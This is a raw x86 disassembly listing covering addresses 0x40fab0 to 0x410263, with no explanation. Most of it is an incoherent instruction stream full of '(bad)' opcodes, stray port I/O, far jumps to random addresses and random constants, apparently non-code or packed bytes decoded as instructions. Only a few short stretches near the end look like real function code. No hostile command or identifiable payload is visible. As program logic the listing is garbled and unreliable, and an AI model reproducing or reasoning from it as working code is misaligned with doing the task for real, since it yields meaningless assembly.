  40fab0:	nop
  40fab1:	sub    eax,0xf110d108
  40fab6:	mov    edi,0x6fe189cf
  40fabb:	dec    ebp
  40fabc:	inc    esi
  40fabd:	fwait
  40fabe:	sti    
  40fabf:	adc    al,0x12
  40fac1:	mov    dl,0xde
  40fac3:	sub    BYTE PTR [eax+ebp*4-0x648a5026],0xda
  40facb:	outs   dx,BYTE PTR ds:[esi]
  40facc:	imul   bl
  40face:	pop    es
  40facf:	push   eax
  40fad0:	in     al,0x80
  40fad2:	fiadd  WORD PTR [ebx+0x66f0b901]
  40fad8:	or     eax,0xbf6f2dae
  40fadd:	adc    al,ch
  40fadf:	adc    al,0x1c
  40fae1:	add    BYTE PTR [esp+eiz*8+0x3808ddab],ch
  40fae8:	cmp    esi,ecx
  40faea:	jle    0x40fad5
  40faec:	xor    al,0x77
  40faee:	mov    esi,DWORD PTR [edx+0x1a0aeab9]
  40faf4:	jmp    0x40fb62
  40faf6:	mov    ebx,0xd64256bb
  40fafb:	fldenv [esp+edi*4-0x31]
  40faff:	jp     0x40fa91
  40fb01:	and    ebx,edx
  40fb03:	fld    DWORD PTR [ebx-0x35]
  40fb06:	cmp    eax,0xffffffce
  40fb09:	inc    ebx
  40fb0a:	push   cs
  40fb0b:	clc    
  40fb0c:	xor    DWORD PTR [ecx+ebx*2+0x3767ee7c],ecx
  40fb13:	jl     0x40fa9e
  40fb15:	or     dl,cl
  40fb17:	push   ecx
  40fb18:	xchg   edx,eax
  40fb19:	cli    
  40fb1a:	(bad)  
  40fb1b:	in     eax,0x95
  40fb1d:	add    eax,0x15c2ece5
  40fb22:	rol    DWORD PTR [ebx],1
  40fb24:	ror    BYTE PTR [eax-0x7],cl
  40fb27:	es nop
  40fb29:	cmp    ebx,ebp
  40fb2b:	adc    edx,ebp
  40fb2d:	xchg   BYTE PTR [edi-0x54],bl
  40fb30:	mov    edx,0xd2e961b7
  40fb35:	in     eax,0x38
  40fb37:	sub    bh,BYTE PTR [edi-0x6a]
  40fb3a:	adc    BYTE PTR [ecx-0x6a],dh
  40fb3d:	ja     0x40fada
  40fb3f:	cmc    
  40fb40:	and    al,0x80
  40fb42:	rol    al,1
  40fb44:	push   eax
  40fb45:	and    eax,0x9e9488e7
  40fb4a:	or     BYTE PTR [ebx-0x667e81f5],dh
  40fb50:	or     eax,0xff2acad9
  40fb55:	push   ds
  40fb56:	stc    
  40fb57:	and    esp,ebp
  40fb59:	ret    
  40fb5a:	retf   
  40fb5b:	mov    DWORD PTR [ecx+0x24],ebp
  40fb5e:	or     ebp,DWORD PTR ds:[edi]
  40fb61:	inc    DWORD PTR [edx-0x4e]
  40fb64:	ret    0x433c
  40fb67:	icebp  
  40fb68:	sub    eax,DWORD PTR [ebp+0x76]
  40fb6b:	or     al,0x1c
  40fb6d:	add    ebx,ebp
  40fb6f:	(bad)  
  40fb70:	mov    al,ds:0x1a8a0e70
  40fb75:	push   ecx
  40fb76:	je     0x40fb85
  40fb78:	sub    ebx,DWORD PTR ds:0x4ba32e57
  40fb7e:	js     0x40fb52
  40fb80:	out    0x2,al
  40fb82:	xchg   edx,eax
  40fb83:	add    BYTE PTR [edx],dl
  40fb85:	xor    BYTE PTR [esi],bh
  40fb87:	inc    eax
  40fb88:	mov    esp,0xdc33c79c
  40fb8d:	pop    ecx
  40fb8e:	popf   
  40fb8f:	(bad)  
  40fb90:	fidiv  DWORD PTR [edi+0x46]
  40fb93:	sub    al,BYTE PTR [ebx+0x5e]
  40fb96:	and    edx,ebx
  40fb98:	aas    
  40fb99:	scas   eax,DWORD PTR es:[edi]
  40fb9a:	mov    cl,0xf7
  40fb9c:	data16 jecxz 0x40fbc2
  40fb9f:	xor    BYTE PTR [esi+ecx*8-0x68679f1],dl
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x66
  40fbc9:	hlt    
  40fbca:	push   ss
  40fbcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	int3   
  40fbd5:	pop    ebp
  40fbd6:	popa   
  40fbd7:	mov    edi,0x4fccc8dc
  40fbdc:	mov    eax,ds:0xafaa92b9
  40fbe1:	jp     0x40fbb3
  40fbe3:	neg    DWORD PTR [ecx-0x65bd5825]
  40fbe9:	push   es
  40fbea:	shl    DWORD PTR [edi-0x8],1
  40fbed:	mov    bl,0xbd
  40fbef:	das    
  40fbf0:	sar    BYTE PTR [edx],cl
  40fbf2:	cmp    BYTE PTR [edx+0x4d219004],ch
  40fbf8:	sahf   
  40fbf9:	rcr    ebx,cl
  40fbfb:	gs adc eax,0x516cdfc3
  40fc01:	push   esi
  40fc02:	int    0x20
  40fc04:	retf   
  40fc05:	push   DWORD PTR [ebx-0x59]
  40fc08:	(bad)  
  40fc09:	je     0x40fbe3
  40fc0b:	aam    0x9
  40fc0d:	les    ecx,FWORD PTR [ecx]
  40fc0f:	push   eax
  40fc10:	cmp    BYTE PTR [ecx+edx*1-0x21830e0d],dh
  40fc17:	mov    dh,0xb4
  40fc19:	pop    eax
  40fc1a:	(bad)  
  40fc1c:	xor    bh,BYTE PTR [si]
  40fc1f:	dec    ebx
  40fc20:	call   0xaf73:0xa6c2bb37
  40fc27:	arpl   WORD PTR [ebx],sp
  40fc29:	test   al,0x6e
  40fc2b:	std    
  40fc2c:	xor    al,0x88
  40fc2e:	nop
  40fc2f:	pushf  
  40fc30:	jmp    0xd10ece98
  40fc35:	jp     0x40fc90
  40fc37:	xchg   BYTE PTR [eax+0xb],dl
  40fc3a:	pop    eax
  40fc3b:	stc    
  40fc3c:	addr16 in eax,dx
  40fc3e:	ds push esi
  40fc40:	mov    dh,0x39
  40fc42:	mov    BYTE PTR [esi],al
  40fc44:	imul   edx,DWORD PTR [eax-0x4e2a4d10],0x41345825
  40fc4e:	mov    dl,0x27
  40fc50:	push   0x35c453d3
  40fc55:	shl    DWORD PTR [ebp+0x71156144],cl
  40fc5b:	mov    dh,0x2a
  40fc5d:	call   0x2e75a153
  40fc62:	es sub al,0x44
  40fc65:	pop    ebx
  40fc66:	jmp    0x92f4a66c
  40fc6b:	inc    esp
  40fc6c:	loop   0x40fc33
  40fc6e:	int    0xfd
  40fc70:	adc    DWORD PTR [ebx-0x471816cf],ecx
  40fc76:	add    esi,DWORD PTR [ebp+0x63]
  40fc79:	(bad)  
  40fc7a:	pop    edi
  40fc7b:	xchg   ebp,eax
  40fc7c:	mov    ?,WORD PTR [esi-0x70]
  40fc7f:	jmp    0x99c:0x19833538
  40fc86:	mov    al,0x2e
  40fc88:	fistp  DWORD PTR [ecx-0x13]
  40fc8b:	cs inc esp
  40fc8d:	adc    BYTE PTR [edi+ecx*2-0x54],cl
  40fc91:	test   bh,ah
  40fc93:	jo     0x40fcef
  40fc95:	jp     0x40fcaa
  40fc97:	pop    ss
  40fc98:	jno    0x40fc9f
  40fc9a:	nop
  40fc9b:	add    dl,BYTE PTR [esi]
  40fc9d:	push   esi
  40fc9e:	hlt    
  40fc9f:	xchg   ebx,eax
  40fca0:	jmp    0x1efc:0x9c579a0f
  40fca7:	inc    edx
  40fca8:	push   edx
  40fca9:	mov    eax,ds:0x5153a85a
  40fcae:	mov    ch,0x48
  40fcb0:	mov    ecx,0x71ae2318
  40fcb5:	dec    cl
  40fcb7:	cmp    eax,0xa459687a
  40fcbc:	in     eax,dx
  40fcbd:	fst    DWORD PTR [edi]
  40fcbf:	mov    al,0xb3
  40fcc1:	mov    eax,0x2426bc19
  40fcc6:	ss push cs
  40fcc8:	and    ecx,DWORD PTR [ebx]
  40fcca:	in     eax,dx
  40fccb:	mov    al,0x75
  40fccd:	cdq    
  40fcce:	retf   0x9a2d
  40fcd1:	jmp    0x40fd51
  40fcd3:	in     eax,dx
  40fcd4:	push   0x5b9e4302
  40fcd9:	jg     0x40fcdb
  40fcdb:	inc    esp
  40fcdc:	int3   
  40fcdd:	mov    DWORD PTR [esi+0x7e23db4],edx
  40fce3:	enter  0x55f3,0x48
  40fce7:	in     eax,0x81
  40fce9:	es jne 0x40fd2b
  40fcec:	jo     0x40fd17
  40fcee:	or     DWORD PTR [ecx-0x3b],0xffffffb6
  40fcf2:	iret   
  40fcf3:	mov    ebx,0x3eda6b05
  40fcf8:	pop    esi
  40fcf9:	test   eax,0x7bc5db51
  40fcfe:	imul   eax,DWORD PTR [edx+0x71bacfa1],0x61
  40fd05:	mov    eax,ds:0x3c20c0b8
  40fd0a:	mov    ah,0x1b
  40fd0c:	jl     0x40fd16
  40fd0e:	fucomp st(6)
  40fd10:	cmp    al,0xce
  40fd12:	inc    ebp
  40fd13:	sbb    eax,0x2f66a49
  40fd18:	fmul   st(5),st
  40fd1a:	dec    ebx
  40fd1b:	jo     0x40fd4a
  40fd1d:	add    esp,ebx
  40fd1f:	pop    edx
  40fd20:	mov    eax,0xf19e6c4c
  40fd25:	into   
  40fd26:	outs   dx,DWORD PTR ds:[esi]
  40fd27:	addr16 mov ds:0xe21,eax
  40fd2b:	cdq    
  40fd2c:	test   al,0x98
  40fd2e:	fstp   QWORD PTR [edx]
  40fd30:	retf   
  40fd31:	test   edx,eax
  40fd33:	cmp    BYTE PTR cs:[edi-0x3b],ch
  40fd37:	jg     0x40fcef
  40fd39:	jge    0x40fcbc
  40fd3b:	cs add al,0xa9
  40fd3e:	sub    BYTE PTR [ebx+ebx*8-0x19dafde5],ah
  40fd45:	lods   al,BYTE PTR ds:[esi]
  40fd46:	pop    eax
  40fd47:	out    dx,eax
  40fd48:	cmp    esp,DWORD PTR [ebp+0x5d]
  40fd4b:	adc    ch,cl
  40fd4d:	pop    edi
  40fd4e:	ja     0x40fd51
  40fd50:	and    eax,0x23cf9eb7
  40fd55:	shl    DWORD PTR [edx+0x4f],1
  40fd58:	dec    edi
  40fd59:	jns    0x40fd2a
  40fd5b:	push   es
  40fd5c:	sub    dl,bl
  40fd5e:	div    BYTE PTR [eax-0x63492316]
  40fd64:	sahf   
  40fd65:	scas   eax,DWORD PTR es:[edi]
  40fd66:	xchg   DWORD PTR [bx+0x6900],edi
  40fd6b:	jb     0x40fdaf
  40fd6d:	add    al,0x2a
  40fd6f:	sub    al,0x38
  40fd71:	sub    ebx,DWORD PTR [edx]
  40fd73:	push   0xffffff9d
  40fd75:	push   edx
  40fd76:	test   BYTE PTR ds:0x8dc9ae97,ah
  40fd7c:	or     al,0x5d
  40fd7e:	add    BYTE PTR [eax],0x1c
  40fd81:	adc    DWORD PTR [esi+edi*4+0x72b39304],esi
  40fd88:	cmp    esi,DWORD PTR es:[esi]
  40fd8b:	fild   QWORD PTR [ecx]
  40fd8d:	rcr    BYTE PTR [esp+0x230ba1b5],cl
  40fd94:	aas    
  40fd95:	pop    esi
  40fd96:	mov    al,ds:0xf8edfaad
  40fd9b:	push   cs
  40fd9c:	mov    bl,dh
  40fd9e:	pop    edi
  40fd9f:	inc    esp
  40fda0:	js     0x40fd88
  40fda2:	loop   0x40fdfb
  40fda4:	jmp    0xc6d1:0x583a5cef
  40fdab:	mov    dl,0xd6
  40fdad:	ja     0x40fd31
  40fdaf:	sub    BYTE PTR [esi+edx*4],bh
  40fdb2:	aad    0x82
  40fdb4:	add    BYTE PTR [eax],bh
  40fdb6:	push   es
  40fdb7:	xchg   esi,eax
  40fdb8:	dec    esi
  40fdb9:	lahf   
  40fdba:	(bad)
  40fdbe:	loopne 0x40fdba
  40fdc0:	lds    esi,FWORD PTR [edx+0x6cd94849]
  40fdc6:	mov    esp,DWORD PTR ds:0x5d26b2b8
  40fdcc:	xchg   edx,eax
  40fdcd:	das    
  40fdce:	call   0x8f86f0ad
  40fdd3:	dec    ecx
  40fdd4:	ins    DWORD PTR es:[edi],dx
  40fdd5:	push   esp
  40fdd6:	shr    BYTE PTR [ecx-0x5a6f2cc2],1
  40fddc:	push   ebp
  40fddd:	jno    0x40fd89
  40fddf:	pop    esp
  40fde0:	pop    ecx
  40fde1:	jo     0x40fe44
  40fde3:	data16 jnp 0x40fe2c
  40fde6:	or     eax,0x380dcfc2
  40fdeb:	imul   esi,DWORD PTR [esi+0x395e1d6e],0x24
  40fdf2:	add    DWORD PTR [esi],edx
  40fdf4:	xchg   esi,eax
  40fdf5:	xchg   esp,eax
  40fdf6:	cmp    ebp,DWORD PTR [edi-0x7d772155]
  40fdfc:	push   eax
  40fdfd:	jmp    0x40fe7a
  40fdff:	mov    ds:0x51b5b5ec,al
  40fe04:	push   0x3d
  40fe06:	xchg   ebp,eax
  40fe07:	fsubr  DWORD PTR [edi]
  40fe09:	mov    esi,ebp
  40fe0b:	out    0xde,al
  40fe0d:	fild   QWORD PTR [edx-0x231d8db1]
  40fe13:	pop    eax
  40fe14:	and    al,0x52
  40fe16:	mov    al,0xfc
  40fe18:	pop    es
  40fe19:	and    bl,al
  40fe1b:	push   ebp
  40fe1c:	xchg   ebp,eax
  40fe1d:	or     al,0x3c
  40fe1f:	popa   
  40fe20:	push   0xfffffff2
  40fe22:	add    ch,BYTE PTR [ebx]
  40fe24:	sub    esi,0x6f
  40fe27:	aad    0xfa
  40fe29:	ret    0x6011
  40fe2c:	mov    bh,0xfa
  40fe2e:	mov    bl,0xe
  40fe30:	jb     0x40fde3
  40fe32:	je     0x40fdf6
  40fe34:	push   esp
  40fe35:	ins    DWORD PTR es:[edi],dx
  40fe36:	cld    
  40fe37:	mov    esi,0x99ae7a89
  40fe3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe3d:	paddusw mm3,QWORD PTR [ecx-0x1e0038e4]
  40fe44:	shr    edx,1
  40fe46:	jae    0x40fe98
  40fe48:	jmp    0x40fe79
  40fe4a:	sahf   
  40fe4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe4c:	fcomp  QWORD PTR [ecx+0x68d2e2de]
  40fe52:	adc    esi,DWORD PTR [ecx-0x41b2f1f]
  40fe58:	jmp    0x8b80:0xba765b52
  40fe5f:	mov    edx,0x726898f7
  40fe64:	jecxz  0x40fe84
  40fe66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe67:	jp     0x40fe28
  40fe69:	dec    edx
  40fe6a:	add    dl,BYTE PTR [ecx]
  40fe6c:	aam    0x6b
  40fe6e:	jmp    0xd8cb8be3
  40fe73:	mov    dh,ch
  40fe75:	push   ss
  40fe76:	mov    dh,0x63
  40fe78:	ins    DWORD PTR es:[edi],dx
  40fe79:	dec    edx
  40fe7a:	ret    
  40fe7b:	or     BYTE PTR [ecx],ah
  40fe7d:	out    0xc,al
  40fe7f:	mov    edi,0xb05933ca
  40fe84:	clc    
  40fe85:	sbb    DWORD PTR [ebx],ebp
  40fe87:	cmp    BYTE PTR [ecx-0x75798bc4],cl
  40fe8d:	push   esi
  40fe8e:	and    DWORD PTR [edi-0x6cb77856],esi
  40fe94:	mov    ebx,0x6165a19b
  40fe99:	jle    0x40fec8
  40fe9b:	addr16 in al,0x52
  40fe9e:	pushaw 
  40fea0:	popa   
  40fea1:	xor    dh,dh
  40fea3:	inc    edx
  40fea4:	xor    DWORD PTR [eax+0x58],0x210c1cf2
  40feab:	into   
  40feac:	inc    ebx
  40fead:	scas   eax,DWORD PTR es:[edi]
  40feae:	adc    BYTE PTR [edi],0xe8
  40feb1:	jecxz  0x40fee2
  40feb3:	cmovle ecx,DWORD PTR [edx+0x60]
  40feb7:	aas    
  40feb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feb9:	rcl    al,1
  40febb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40febc:	cmc    
  40febd:	sar    esi,cl
  40febf:	mov    eax,DWORD PTR [ebx]
  40fec1:	push   ebp
  40fec2:	push   cs
  40fec3:	sahf   
  40fec4:	dec    ecx
  40fec5:	mov    edx,0xb237bfda
  40feca:	ins    DWORD PTR es:[edi],dx
  40fecb:	addr16 mov ebp,edx
  40fece:	jo     0x40ff4d
  40fed0:	(bad)  
  40fed1:	in     al,dx
  40fed2:	aas    
  40fed3:	out    0xd,eax
  40fed5:	jge    0x40fe62
  40fed7:	inc    ebp
  40fed8:	or     al,0x33
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xe0464346
  40fef3:	fmul   QWORD PTR [ebx]
  40fef5:	fidiv  WORD PTR [ebp+0x7d7c7e7e]
  40fefb:	jle    0x40ff7b
  40fefd:	push   ebx
  40fefe:	dec    edx
  40feff:	scas   eax,DWORD PTR es:[edi]
  40ff00:	jo     0x40ff17
  40ff02:	add    eax,0xe561db4b
  40ff07:	and    bh,al
  40ff09:	test   eax,0x54d09915
  40ff0e:	fadd   DWORD PTR [ebp-0x1f]
  40ff11:	jb     0x40ff19
  40ff13:	cmc    
  40ff14:	jle    0x40febe
  40ff16:	fstp   QWORD PTR [edi+0x2c]
  40ff19:	or     esi,esp
  40ff1b:	bound  eax,QWORD PTR [edi-0x5ae9b4d5]
  40ff21:	pop    ecx
  40ff22:	cld    
  40ff23:	push   ecx
  40ff24:	lods   al,BYTE PTR ds:[esi]
  40ff25:	fisubr DWORD PTR [ecx]
  40ff27:	mov    BYTE PTR [edx+0x3b],ch
  40ff2a:	mov    dl,0x36
  40ff2c:	repz in al,0x4e
  40ff2f:	xor    ebp,esi
  40ff31:	mov    bl,0xd1
  40ff33:	inc    ecx
  40ff34:	retf   0x6477
  40ff37:	fstp   QWORD PTR [eax+0x5b]
  40ff3a:	rol    DWORD PTR ds:0xa4b835a9,1
  40ff40:	or     BYTE PTR [edx-0x1f],0x91
  40ff44:	xchg   esi,eax
  40ff45:	ret    
  40ff46:	ins    BYTE PTR es:[edi],dx
  40ff47:	inc    esp
  40ff48:	mov    ch,0xff
  40ff4a:	and    al,0x6c
  40ff4c:	test   ah,ah
  40ff4e:	dec    ebp
  40ff4f:	rcl    DWORD PTR ds:0x52aae4b2,cl
  40ff56:	and    BYTE PTR [edx-0x5e],al
  40ff59:	inc    esp
  40ff5a:	shr    BYTE PTR [ecx+0x3b6d4c9a],cl
  40ff60:	and    ebx,eax
  40ff62:	lds    edx,FWORD PTR [edx+0xb01bc1e]
  40ff68:	dec    esp
  40ff69:	cmp    ecx,esp
  40ff6b:	jecxz  0x40ff84
  40ff6d:	xor    ah,al
  40ff6f:	pusha  
  40ff70:	sti    
  40ff71:	xchg   ebx,eax
  40ff72:	sbb    al,0xf4
  40ff74:	sbb    al,0x1c
  40ff76:	sbb    esp,0xfffffff7
  40ff79:	into   
  40ff7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff7b:	mov    eax,ds:0x13d49caf
  40ff80:	mov    ch,0x41
  40ff82:	daa    
  40ff83:	dec    esi
  40ff84:	or     eax,0xb7ee5cef
  40ff89:	addr16 push ebx
  40ff8b:	ss popa 
  40ff8d:	mov    ah,0xa2
  40ff8f:	cmp    al,0xe8
  40ff91:	fidiv  DWORD PTR [esp+esi*2-0x5f857fa8]
  40ff98:	jecxz  0x40ff72
  40ff9a:	xlat   BYTE PTR ds:[ebx]
  40ff9b:	ret    
  40ff9c:	xor    bh,BYTE PTR [esi-0x2e]
  40ff9f:	ins    BYTE PTR es:[edi],dx
  40ffa0:	jno    0x40ff38
  40ffa2:	nop
  40ffa3:	dec    esp
  40ffa4:	xchg   BYTE PTR [eax+eax*1+0x77],al
  40ffa8:	lahf   
  40ffa9:	mov    al,ds:0x4a71b6d4
  40ffae:	jge    0x40ffc2
  40ffb0:	inc    edx
  40ffb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffb2:	out    dx,eax
  40ffb3:	jp     0x410033
  40ffb5:	imul   ecx,edx,0xb59b6b62
  40ffbb:	sub    DWORD PTR [edi],edx
  40ffbd:	push   edx
  40ffbe:	xlat   BYTE PTR ds:[ebx]
  40ffbf:	stos   DWORD PTR es:[edi],eax
  40ffc0:	and    dl,BYTE PTR [ecx]
  40ffc2:	jmp    0x296f:0x56858156
  40ffc9:	ins    DWORD PTR es:[edi],dx
  40ffca:	fistp  WORD PTR [ebx-0x36]
  40ffcd:	mov    eax,0x5ccded40
  40ffd2:	popf   
  40ffd3:	inc    edi
  40ffd4:	and    al,0x5b
  40ffd6:	add    esp,edi
  40ffd8:	sbb    eax,0xb9ec5cd
  40ffdd:	dec    ebp
  40ffde:	inc    edi
  40ffdf:	es mov dl,0x7d
  40ffe2:	or     eax,0x803ca1c
  40ffe7:	mov    WORD PTR [ecx-0x48510950],ds
  40ffed:	or     dh,BYTE PTR [ecx+0x1637558d]
  40fff3:	cld    
  40fff4:	or     eax,0xf827726e
  40fff9:	test   al,0x74
  40fffb:	lock retf 0xaa35
  40ffff:	sub    ecx,DWORD PTR [edx-0x40df79d9]
  410005:	push   ebx
  410006:	push   cs
  410007:	jmp    0x83aeab9
  41000c:	imul   esi,DWORD PTR [ebx],0x880f0cf2
  410012:	jno    0x40ffd0
  410014:	or     al,bl
  410016:	stc    
  410017:	dec    esp
  410018:	inc    ebx
  410019:	(bad)  
  41001a:	aad    0x26
  41001c:	add    al,0xf4
  41001e:	ds and al,0x38
  410021:	cli    
  410022:	and    DWORD PTR ds:0x3a4bce37,edi
  410028:	daa    
  410029:	xchg   BYTE PTR [ebx+edx*2+0x44],ch
  41002d:	sbb    al,0x0
  41002f:	dec    esi
  410030:	ud1    ebx,ebx
  410033:	sbb    al,0xc3
  410035:	push   ebx
  410036:	or     bl,BYTE PTR [ebx]
  410038:	dec    ecx
  410039:	das    
  41003a:	mov    edx,0x5469aeec
  41003f:	outs   dx,BYTE PTR ds:[esi]
  410040:	pop    edx
  410041:	and    eax,0x4ab06937
  410046:	aam    0xe7
  410048:	fs test eax,0xf30eb8e7
  41004e:	pop    ebx
  41004f:	mov    esp,0x5ddd161f
  410054:	cmp    eax,0xb1cdffd3
  410059:	xchg   BYTE PTR [ebx+0x5f],dl
  41005c:	mov    ebp,0x35bd00e1
  410061:	popf   
  410062:	mov    bl,0x2b
  410064:	leave  
  410065:	add    eax,0x686ccb95
  41006a:	lahf   
  41006b:	xchg   ebx,eax
  41006c:	cs xchg ebp,eax
  41006e:	pop    ebp
  41006f:	adc    DWORD PTR [eax],edi
  410071:	clc    
  410072:	lds    edx,FWORD PTR [ecx+0x4a]
  410075:	dec    ebp
  410076:	gs (bad) 
  410078:	es inc esi
  41007a:	scas   eax,DWORD PTR es:[edi]
  41007b:	ret    
  41007c:	shl    BYTE PTR [esp+eax*1-0x7d448279],cl
  410083:	test   BYTE PTR cs:[eax+0x2b],ah
  410087:	stos   BYTE PTR es:[edi],al
  410088:	shl    BYTE PTR [ebp+0x35],0xa4
  41008c:	lock call 0xc5f0:0xcd3856a9
  410094:	int    0x11
  410096:	and    al,BYTE PTR [ebx]
  410098:	push   0xffffffd5
  41009a:	sub    al,al
  41009c:	add    eax,0x270344dd
  4100a1:	retf   0x6169
  4100a4:	fisttp WORD PTR [edx+edx*4+0x35]
  4100a8:	inc    edi
  4100a9:	pop    ds
  4100aa:	repz inc esi
  4100ac:	(bad)  
  4100ad:	jns    0x41009f
  4100af:	mov    cl,0xe3
  4100b1:	adc    BYTE PTR [eax+0x23d41a4f],ah
  4100b7:	fs xchg edi,eax
  4100b9:	pop    es
  4100ba:	in     eax,0xe9
  4100bc:	push   ebp
  4100bd:	jo     0x410083
  4100bf:	loop   0x410096
  4100c1:	std    
  4100c2:	mov    eax,0xe9fb8037
  4100c7:	pop    esp
  4100c8:	jge    0x4100d4
  4100ca:	push   ecx
  4100cb:	fild   WORD PTR [ecx+0x55]
  4100ce:	retf   
  4100cf:	mov    eax,ds:0xc30790aa
  4100d4:	int3   
  4100d5:	xor    al,0x9c
  4100d7:	outs   dx,BYTE PTR ds:[esi]
  4100d8:	jne    0x4100c4
  4100da:	scas   eax,DWORD PTR es:[edi]
  4100db:	xchg   ebx,eax
  4100dc:	je     0x4100e3
  4100de:	push   esi
  4100df:	xchg   ebp,eax
  4100e0:	int    0x51
  4100e2:	ret    
  4100e3:	test   bh,dl
  4100e5:	out    0x56,al
  4100e7:	pop    eax
  4100e8:	pop    ss
  4100e9:	mov    DWORD PTR [ebp+esi*4+0x439d707b],ecx
  4100f0:	loopne 0x410166
  4100f2:	(bad)  
  4100f3:	pop    ebp
  4100f4:	test   al,0xc7
  4100f6:	adc    edx,ebp
  4100f8:	xchg   DWORD PTR [edi+eiz*4],ebp
  4100fb:	shl    cl,cl
  4100fd:	cld    
  4100fe:	dec    ebx
  4100ff:	xchg   edi,eax
  410100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410101:	adc    esi,DWORD PTR [esi-0x6cd4a523]
  410107:	mov    esp,0xf99aef1f
  41010c:	icebp  
  41010d:	lahf   
  41010e:	xor    DWORD PTR [esi-0x2e2c71df],0x222476dd
  410118:	cmc    
  410119:	add    eax,0x6beec7cd
  41011e:	jmp    0x4100e6
  410120:	push   esi
  410121:	jge    0x41010a
  410123:	in     al,dx
  410124:	fadd   QWORD PTR [ebx+ebp*4-0x44]
  410128:	cmp    eax,0xad980314
  41012d:	out    dx,eax
  41012e:	dec    edx
  41012f:	mov    al,ds:0xe835752a
  410134:	push   ebx
  410135:	mov    eax,ds:0x6bd9bad3
  41013a:	mov    ss,ecx
  41013c:	out    dx,al
  41013d:	inc    DWORD PTR [eax]
  41013f:	jl     0x410117
  410141:	xchg   ebp,eax
  410142:	jle    0x41014b
  410144:	adc    BYTE PTR [edx],bh
  410146:	enter  0x8800,0xb7
  41014a:	push   0x239fbf7f
  41014f:	repz fs out dx,al
  410152:	dec    dx
  410154:	cs jbe 0x4101c6
  410157:	cmp    esp,eax
  410159:	push   esi
  41015a:	push   ebp
  41015b:	sbb    ch,dh
  41015d:	adc    al,0xd5
  41015f:	cmc    
  410160:	xchg   DWORD PTR [ebx],esp
  410162:	or     ebp,eax
  410164:	stc    
  410165:	sbb    eax,0xb5b00ec5
  41016a:	dec    ebp
  41016b:	retf   0x931f
  41016e:	pop    ds
  41016f:	mov    dl,0xe9
  410171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410172:	pop    esi
  410173:	jbe    0x41014e
  410175:	adc    eax,0x2a0e72a8
  41017a:	cmp    cl,dh
  41017c:	mov    ebp,0x457822c
  410181:	or     al,0xab
  410183:	dec    edx
  410184:	xor    BYTE PTR [esi-0x2c],bl
  410187:	int3   
  410188:	inc    eax
  410189:	mov    edi,0xd20bf010
  41018e:	(bad)
  410192:	mov    ecx,0xb80980f2
  410197:	shl    DWORD PTR [ebp-0x6063010b],0x7c
  41019e:	test   eax,0xff8996c9
  4101a3:	outs   dx,BYTE PTR ds:[esi]
  4101a4:	push   0xb03da209
  4101a9:	xchg   ecx,eax
  4101aa:	xrelease lock adc BYTE PTR [ecx+edx*1-0x525ec4e8],0xfa
  4101b4:	retf   
  4101b5:	jo     0x41014d
  4101b7:	mov    ds:0xd0f97310,al
  4101bc:	int    0xd
  4101be:	(bad)  
  4101bf:	push   esp
  4101c0:	cmp    eax,0x8981359
  4101c5:	popf   
  4101c6:	clc    
  4101c7:	pop    eax
  4101c8:	dec    eax
  4101c9:	inc    edi
  4101ca:	adc    DWORD PTR [esi-0x53],esi
  4101cd:	push   edx
  4101ce:	dec    eax
  4101cf:	push   es
  4101d0:	outs   dx,BYTE PTR ds:[esi]
  4101d1:	daa    
  4101d2:	lods   eax,DWORD PTR ds:[esi]
  4101d3:	xchg   DWORD PTR ds:0x698b7545,edx
  4101d9:	arpl   WORD PTR [edi],sp
  4101db:	xor    dh,BYTE PTR [eax]
  4101dd:	push   ds
  4101de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e0:	jp     0x41016a
  4101e2:	in     al,dx
  4101e3:	sbb    eax,DWORD PTR [eax+0x45]
  4101e6:	push   esp
  4101e7:	add    DWORD PTR [edx-0x5482cf74],ebp
  4101ed:	and    eax,0x1cb9d907
  4101f2:	mov    ?,ecx
  4101f4:	cdq    
  4101f5:	cmp    dh,BYTE PTR [edi+edi*2+0x614188ef]
  4101fc:	pop    edx
  4101fd:	(bad)  
  4101fe:	leave  
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43379f
  41021e:	adc    DWORD PTR ds:0x4337d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43370b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43382b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
